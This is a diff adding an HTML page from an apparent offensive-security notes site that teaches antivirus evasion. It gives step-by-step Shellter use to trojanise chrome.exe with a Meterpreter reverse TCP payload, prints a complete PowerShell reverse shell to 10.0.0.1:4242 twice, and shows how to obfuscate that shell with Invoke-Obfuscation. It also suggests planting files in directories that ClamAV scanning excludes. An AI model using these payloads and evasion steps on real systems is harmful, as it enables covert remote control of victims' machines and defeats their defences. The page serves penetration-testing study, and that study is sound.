@@ -1,0 +1,108 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>offsecnotes | AV evasion</title>
+  <link rel="icon" type="image/png" href="/static/favicon.png">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@exampledev/new.css@1.1.2/new.min.css">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.11.1/styles/github.min.css" media="(prefers-color-scheme: light)" data-theme-css="light">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.11.1/styles/github-dark.min.css" media="(prefers-color-scheme: dark)" data-theme-css="dark">
+  <link rel="stylesheet" href="/static/style.css">
+  <script>
+    // Theme: saved choice (light/dark) or, if none, the system preference.
+    // Runs before the page is drawn, so there's no flash of the wrong theme.
+    function setTheme(theme) {
+      document.documentElement.dataset.theme = theme;
+      document.querySelectorAll("link[data-theme-css]").forEach(function (link) {
+        link.media = link.dataset.themeCss === theme ? "all" : "not all";
+      });
+    }
+    function toggleTheme() {
+      var current = document.documentElement.dataset.theme ||
+        (matchMedia("(prefers-color-scheme: dark)").matches ? "dark" : "light");
+      var next = current === "dark" ? "light" : "dark";
+      setTheme(next);
+      try { localStorage.setItem("theme", next); } catch (e) {}
+    }
+    try { var saved = localStorage.getItem("theme"); if (saved) setTheme(saved); } catch (e) {}
+  </script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.11.1/highlight.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.11.1/languages/go.min.js"></script>
+  <script>hljs.highlightAll();</script>
+</head>
+<body>
+  <header>
+    <div class="header-top">
+      <h1>offsecnotes</h1>
+      <button class="theme-toggle" onclick="toggleTheme()" aria-label="Toggle light/dark theme" title="Toggle theme"></button>
+    </div>
+    <nav>
+      <a href="/">Home</a> • <a href="/Android/">Android</a> • <a href="/Web/">Web</a> •
+      <a href="/Network/">Network</a> • <a href="/Linux/">Linux</a> •
+      <a href="/Windows/">Windows</a> • <a href="/Misc/">Misc</a>
+    </nav>
+  </header>
+  <h1>AV evasion</h1>
+  <span>by frankheat</span>
+  <div class="toc"><ul>
+<li><a href="#av-evasion-with-shellter" id="toc-av-evasion-with-shellter">AV evasion with shellter</a></li>
+<li><a href="#av-evasion-for-powershell-script---invoke-obfuscation" id="toc-av-evasion-for-powershell-script---invoke-obfuscation">AV evasion for powershell script - Invoke-Obfuscation</a></li>
+<li><a href="#tips" id="toc-tips">Tips</a></li>
+</ul></div>
+  <hr>
+<h2 id="av-evasion-with-shellter">AV evasion with shellter</h2>
+<ul>
+<li>Shellter is a dynamic shellcode injection tool aka dynamic PE infector. It can be used in order to inject shellcode into native Windows applications (currently 32-bit apps only). The shellcode can be something yours or something generated through a framework, such as Metasploit. Shellter takes advantage of the original structure of the PE file and doesn’t apply any modification such as changing memory access permissions in sections (unless the user wants to), adding an extra section with RWE access, and whatever would look dodgy under an AV scan.</li>
+<li>Install (https://www.kali.org/tools/shellter/)</li>
+<li>How to use (example)
+<ul>
+<li>Start shellter</li>
+<li>Choose operation mode: <code>A</code> (automatic)</li>
+<li>PE target: <code>/path/to/file/chrome.exe</code></li>
+<li>Enable stealth mode? <code>Y</code> (in this way the executable works as intended)</li>
+<li>Select the payload you want (you can also generate a new one)
+<ul>
+<li>For this example we select a listed payload (meterpreter reverce tcp)</li>
+</ul></li>
+<li>Set lhost and lport</li>
+<li>Now the exe will be overwrite (but shellter creates a backup of the original exe)</li>
+<li>Set listener (ex. multi/handler), download the exe on the target machine and execute</li>
+</ul></li>
+</ul>
+<hr />
+<h2 id="av-evasion-for-powershell-script---invoke-obfuscation">AV evasion for powershell script - Invoke-Obfuscation</h2>
+<ul>
+<li>https://github.com/danielbohannon/Invoke-Obfuscation</li>
+<li>Require powershell (<code>sudo apt install powershell -y</code>). You can run powershell with <code>pwsh</code></li>
+<li>cd into invoke-obfuscation folder</li>
+<li><code>Import-Module ./Invoke-Obfuscation.psd1</code></li>
+<li><code>Invoke-Obfuscation</code></li>
+<li>Copy a reverse shell in poweshell (example): <code>powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.0.0.1',4242);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '&gt; ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"</code></li>
+<li>Remove <code>powershell -nop -c</code> and <code>" "</code></li>
+<li><code>$client = New-Object System.Net.Sockets.TCPClient('10.0.0.1',4242);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '&gt; ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()</code></li>
+<li>Set lhost and lport and save (example) as <code>shell.ps1</code></li>
+<li>On Invoke-Obfuscation <code>SET SCRIPTPATH /path/to/shell.ps1</code></li>
+<li>Set <code>AST</code> options (The AST options works better with windows 10…</li>
+<li>Choose one of the AST module: <code>ALL</code></li>
+<li>Choose one of the ASToptions to apply to current payload: <code>1</code></li>
+<li>In the result you will get the result obfuscated code. Copy and save the code</li>
+<li>Set listener (ex. multi/handler), download the exe on the target machine and execute</li>
+</ul>
+<hr />
+<h2 id="tips">Tips</h2>
+<ul>
+<li>See the process of antivirus with <code>ps auxww</code>. Sometimes you can see that the antivirus exclude some directory …
+<ul>
+<li><code>clamscan -r --exclude-dir=/test /</code> . Upload the file in <code>/test</code>.</li>
+</ul></li>
+</ul>
+  <hr>
+  <footer>
+    <p align="center">
+      <a href="https://github.com/frankheat/offsecnotes">Source code</a> •
+      <a href="https://github.com/frankheat">frankheat</a>
+    </p>
+  </footer>
+</body>
+</html>
